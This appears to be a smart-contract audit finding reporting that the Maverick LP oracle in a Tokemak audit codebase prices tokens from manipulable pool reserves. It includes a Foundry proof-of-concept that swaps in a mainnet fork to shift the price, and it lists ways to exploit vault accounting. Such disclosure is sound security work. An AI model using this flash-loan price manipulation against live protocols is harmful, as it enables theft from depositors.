Modern Iris Lemur

high

# Maverick oracle can be manipulated
## Summary
The MavEthOracle.getPriceInEth() function uses the reserves of the Maverick pool to calculate the price of Maverick LP tokens. These reserves can be manipulated, which can lead to incorrect results of Maverick oracle.
## Vulnerability Detail
In the MavEthOracle contract, `getPriceInEth` function utilizes the reserves of the Maverick pool and multiplies them with the external prices of the tokens (obtained from the rootPriceOracle contract) to calculate the total value of the Maverick position.
```solidity=
// Get reserves in boosted position.
(uint256 reserveTokenA, uint256 reserveTokenB) = boostedPosition.getReserves();

// Get total supply of lp tokens from boosted position.
uint256 boostedPositionTotalSupply = boostedPosition.totalSupply();

IRootPriceOracle rootPriceOracle = systemRegistry.rootPriceOracle();

// Price pool tokens.
uint256 priceInEthTokenA = rootPriceOracle.getPriceInEth(address(pool.tokenA()));
uint256 priceInEthTokenB = rootPriceOracle.getPriceInEth(address(pool.tokenB()));

// Calculate total value of each token in boosted position.
uint256 totalBoostedPositionValueTokenA = reserveTokenA * priceInEthTokenA;
uint256 totalBoostedPositionValueTokenB = reserveTokenB * priceInEthTokenB;

// Return price of lp token in boosted position.
return (totalBoostedPositionValueTokenA + totalBoostedPositionValueTokenB) / boostedPositionTotalSupply;
```
However, the reserves of a Maverick position can fluctuate when the price of the Maverick pool changes. Therefore, the returned price of this function can be manipulated by swapping a significant amount of tokens into the Maverick pool. An attacker can utilize a flash loan to initiate a swap, thereby changing the price either upwards or downwards, and subsequently swapping back to repay the flash loan.

Attacker can decrease the returned price of MavEthOracle by swapping a large amount of the higher value token for the lower value token, and vice versa.

Here is a test file that demonstrates how the price of the MavEthOracle contract can be manipulated by swapping to change the reserves.

```solidity=
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import 'forge-std/console.sol';

import { WETH9_ADDRESS, TOKE_MAINNET, WSTETH_MAINNET } from "test/utils/Addresses.sol";

import { IPool } from "src/interfaces/external/maverick/IPool.sol";
import { MavEthOracle } from "src/oracles/providers/MavEthOracle.sol";
import { SystemRegistry, ISystemRegistry } from "src/SystemRegistry.sol";
import { RootPriceOracle } from "src/oracles/RootPriceOracle.sol";
import { AccessController, IAccessController } from "src/security/AccessController.sol";
import { IPriceOracle } from "src/interfaces/oracles/IPriceOracle.sol";
import { SwEthEthOracle} from "src/oracles/providers/SwEthEthOracle.sol";
import { EthPeggedOracle} from "src/oracles/providers/EthPeggedOracle.sol";
import { IswETH } from "src/interfaces/external/swell/IswETH.sol";
import { IPoolPositionDynamicSlim } from "src/interfaces/external/maverick/IPoolPositionDynamicSlim.sol";
import { IERC20 } from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract NewTest is Test {
  SystemRegistry public registry;
  AccessController public accessControl;
  RootPriceOracle public rootOracle;
  MavEthOracle public mavOracle;

  function setUp() external {
    vm.createSelectFork("https://rpc.ankr.com/eth", 17224221);
    registry = new SystemRegistry(TOKE_MAINNET, WETH9_ADDRESS);
    accessControl = new AccessController(address(registry));
    registry.setAccessController(address(accessControl));
    rootOracle = new RootPriceOracle(registry);
    registry.setRootPriceOracle(address(rootOracle));
    mavOracle = new MavEthOracle(registry);
  }

  function swapCallback(
    uint256 amountToPay,
    uint256 amountOut,
    bytes calldata _data
  ) external {
    address tokenIn = abi.decode(_data, (address));
    IERC20(tokenIn).transfer(msg.sender, amountToPay);
  }

  function test_MaverickOracleManipulation() external {
    IswETH swETH = IswETH(0xf951E335afb289353dc249e82926178EaC7DEd78);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address boostedPosition = 0xF917FE742C530Bd66BcEbf64B42c777B13aac92c;
    SwEthEthOracle swEthOracle = new SwEthEthOracle(registry, swETH);
    EthPeggedOracle ethOracle = new EthPeggedOracle(registry);
    rootOracle.registerMapping(address(swETH), swEthOracle);
    rootOracle.registerMapping(weth, ethOracle);

    (uint256 reserveA, uint256 reserveB) = IPoolPositionDynamicSlim(boostedPosition).getReserves();
    console.log("reserves", reserveA, reserveB);
    uint256 mavPriceBefore = mavOracle.getPriceInEth(boostedPosition);
    console.log("mavOracle price before", mavPriceBefore);

    //swap
    deal(address(swETH), address(this), 1e24);
    address pool = IPoolPositionDynamicSlim(boostedPosition).pool();
    IPool(pool).swap(
        address(this),
        1e18,
        false,
        false,
        0,
        abi.encode(address(swETH))
    );

    (reserveA, reserveB) = IPoolPositionDynamicSlim(boostedPosition).getReserves();
    console.log("reserves", reserveA, reserveB);
    uint256 mavPriceAfter = mavOracle.getPriceInEth(boostedPosition);
    console.log("mavOracle price after", mavPriceAfter);
    
    require(mavPriceBefore != mavPriceAfter);
  }
}
```

## Impact
There are multiple impacts that an attacker can exploit by manipulating the price of MavEthOracle:

* Decreasing the oracle price to lower the totalDebt of LMPVault, in order to receive more LMPVault shares.
* Increasing the oracle price to raise the totalDebt of LMPVault, in order to receive more withdrawn tokens.
* Manipulating the results of the Stats contracts to cause miscalculations for the protocol.
## Code Snippet
https://github.com/sherlock-audit/2023-06-tokemak/blob/main/v2-core-audit-2023-07-14/src/oracles/providers/MavEthOracle.sol#L59-L72

## Tool used
Manual Review
Foundry

## Recommendation
Use another calculation for Maverick oracle